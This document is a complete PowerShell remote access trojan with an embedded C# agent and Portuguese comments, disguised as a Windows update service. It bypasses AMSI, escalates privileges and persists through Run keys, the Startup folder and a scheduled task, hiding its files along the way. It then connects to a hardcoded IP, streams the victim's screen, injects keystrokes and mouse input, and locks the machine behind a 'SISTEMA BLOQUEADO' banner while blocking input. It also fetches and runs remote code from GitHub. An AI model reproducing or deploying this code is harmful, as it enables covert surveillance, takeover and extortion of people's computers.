$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

Write-Host "[1] Iniciando..." -ForegroundColor Yellow

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Pedindo Admin..." -ForegroundColor Cyan
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}
Write-Host "[2] Admin OK." -ForegroundColor Green

# Não vamos nos esconder neste teste para podermos ver os logs
# Se for a primeira execução (tela aberta), prepara o ambiente e NÃO esconde
if ($args -notcontains "-silent") {
    Write-Host "[3] Preparando para rodar visível..." -ForegroundColor Yellow
} else {
    $dir = "$env:ProgramData\Microsoft\Windows\Caches"
    $scriptPath = "$dir\$installName.ps1"
    $vbsPath = "$dir\$installName.vbs"

    New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
    
    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
    Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
    
    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
    
    try {
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $startup = [Environment]::GetFolderPath('Startup')
        Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)
        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    
    attrib +h +s +r $scriptPath 2>$null
    attrib +h +s +r $vbsPath 2>$null
}

$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
Write-Host "[3] AMSI Bypass OK." -ForegroundColor Green

if (-not ("R9KAgent" -as [type])) {
    Write-Host "[4] Compilando C#..." -ForegroundColor Yellow
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;
    using Microsoft.Win32;
    using System.Diagnostics;
    using System.Net;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();

        static string IP;
        static int PORT;
        static bool streaming = false;
        static object writeLock = new object();
        static bool isLocked = false;
        static int targetX = 0, targetY = 0;
        static bool hasNewPos = false;
        
        static Form bannerForm = null;
        static Thread bannerThread = null;
        static StreamWriter globalWriter = null;

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            try { SetProcessDPIAware(); } catch {}
            
            Thread tInput = new Thread(InputLoop); tInput.Priority = ThreadPriority.Highest; tInput.IsBackground = true; tInput.Start();

            while (true) {
                TcpClient myClient = null;
                try {
                    Console.WriteLine("[C#] Conectando ao controle...");
                    myClient = new TcpClient();
                    myClient.Connect(IP, PORT);
                    myClient.NoDelay = true;
                    NetworkStream myStream = myClient.GetStream();
                    StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                    StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                    myWriter.AutoFlush = true;
                    globalWriter = myWriter;

                    Console.WriteLine("[C#] CONECTOU! Enviando BANNER...");
                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");

                    Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();

                    while (myClient.Connected) { Thread.Sleep(500); }
                } catch (Exception ex) { 
                    Console.WriteLine("[C#] Erro: " + ex.Message);
                    Thread.Sleep(3000); 
                } finally {
                    streaming = false;
                    globalWriter = null;
                    try { if (myClient != null) myClient.Close(); } catch {}
                }
            }
        }

        static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
            try {
                while (myClient.Connected) {
                    string cmd = myReader.ReadLine();
                    if (cmd == null) { streaming = false; break; }
                    ProcessCommand(cmd.Trim(), myWriter);
                }
            } catch { streaming = false; }
            try { myClient.Close(); } catch {}
        }

        static void InputLoop() {
            while (true) {
                try {
                    if (isLocked) {
                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) { Cursor.Position = new Point(targetX, targetY); }
                    } else {
                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                    }
                } catch {}
                Thread.Sleep(1);
            }
        }

        static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
            while (myClient.Connected) {
                try {
                    if (streaming && myClient.Connected) {
                        Console.WriteLine("[C#] Enviando frame de tela...");
                        string b64 = CaptureScreen(1280, 35);
                        if (b64 != null) {
                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
                            Thread.Sleep(20);
                        } else {
                            Thread.Sleep(100);
                        }
                    } else { 
                        streaming = false;
                        Thread.Sleep(50); 
                    }
                } catch { 
                    streaming = false;
                    try { myClient.Close(); } catch {}
                    break;
                }
            }
        }

        static void ProcessCommand(string cmd, StreamWriter myWriter) {
            try {
                Console.WriteLine("[C#] Comando: " + cmd);
                if (cmd == "stream_start") { streaming = true; return; }
                if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                
                if (cmd == "reinstall") {
                    string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                    try {
                        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"");
                        psi.WindowStyle = ProcessWindowStyle.Hidden;
                        psi.CreateNoWindow = true;
                        Process.Start(psi);
                    } catch {}
                    Environment.Exit(0); 
                }

                if (cmd == "banner_on") {
                    BlockInput(true);
                    bannerThread = new Thread(() => {
                        try {
                            Image bgImg = null;
                            try {
                                using (var wc = new WebClient()) {
                                    wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                                    byte[] imgBytes = wc.DownloadData("https://i.imgur.com/gx1MwjP.jpeg");
                                    using (MemoryStream ms = new MemoryStream(imgBytes)) {
                                        bgImg = Image.FromStream(ms);
                                    }
                                }
                            } catch {}

                            bannerForm = new Form();
                            bannerForm.FormBorderStyle = FormBorderStyle.None;
                            bannerForm.WindowState = FormWindowState.Maximized;
                            bannerForm.TopMost = true;
                            bannerForm.ShowInTaskbar = false;
                            bannerForm.BackColor = Color.Black;
                            
                            if (bgImg != null) {
                                bannerForm.BackgroundImage = bgImg;
                                bannerForm.BackgroundImageLayout = ImageLayout.Stretch;
                            } else {
                                bannerForm.Controls.Add(new Label { Text = "SISTEMA BLOQUEADO", ForeColor = Color.Red, Font = new Font("Arial", 48), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter });
                            }
                            
                            bannerForm.KeyPreview = true;
                            bannerForm.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
                            Application.Run(bannerForm);
                        } catch {}
                    });
                    bannerThread.SetApartmentState(ApartmentState.STA);
                    bannerThread.IsBackground = true;
                    bannerThread.Start();
                    lock(writeLock) { myWriter.WriteLine("BANNER_ON"); }
                    return;
                }

                if (cmd == "banner_off") {
                    BlockInput(false);
                    if (bannerForm != null) {
                        try { bannerForm.BeginInvoke(new Action(() => bannerForm.Close())); } catch {}
                        bannerForm = null;
                    }
                    if (bannerThread != null) { bannerThread.Abort(); bannerThread = null; }
                    lock(writeLock) { myWriter.WriteLine("BANNER_OFF"); }
                    return;
                }

                if (cmd == "uninstall") { 
                    BlockInput(false); 
                    Environment.Exit(0); 
                }
                
                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
                if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }

                if (cmd.StartsWith("move ")) {
                    string[] p = cmd.Split(' ');
                    targetX = int.Parse(p[1]);
                    targetY = int.Parse(p[2]);
                    hasNewPos = true; 
                }
                else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
                else if (cmd == "md 2") mouse_event(0x0008, 0, 0, 0, 0);
                else if (cmd == "mu 2") mouse_event(0x0010, 0, 0, 0, 0);
                else if (cmd == "md 3") mouse_event(0x0020, 0, 0, 0, 0);
                else if (cmd == "mu 3") mouse_event(0x0040, 0, 0, 0, 0);
                else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
            } catch {}
        }

        static string CaptureScreen(int maxW, long quality) {
            try {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
                    using (Graphics g = Graphics.FromImage(bmp)) { 
                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size); 
                    }
                    Bitmap finalBmp = bmp;
                    if (maxW > 0 && bmp.Width > maxW) {
                        int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
                        finalBmp = new Bitmap(newW, newH);
                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                            g2.DrawImage(bmp, 0, 0, newW, newH);
                        }
                    }
                    using (MemoryStream ms = new MemoryStream()) {
                        EncoderParameters ep = new EncoderParameters(1);
                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                        ImageCodecInfo codec = null;
                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { codec = c; break; } }
                        finalBmp.Save(ms, codec, ep);
                        if (finalBmp != bmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            } catch { return null; }
        }
    }
"@
    Write-Host "[4.1] C# Compilado com sucesso!" -ForegroundColor Green
}

Write-Host "[5] Chamando Agente (Janela vai fechar se não for o modo debug)..." -ForegroundColor Cyan
[R9KAgent]::Start($serverIP, $serverPort)
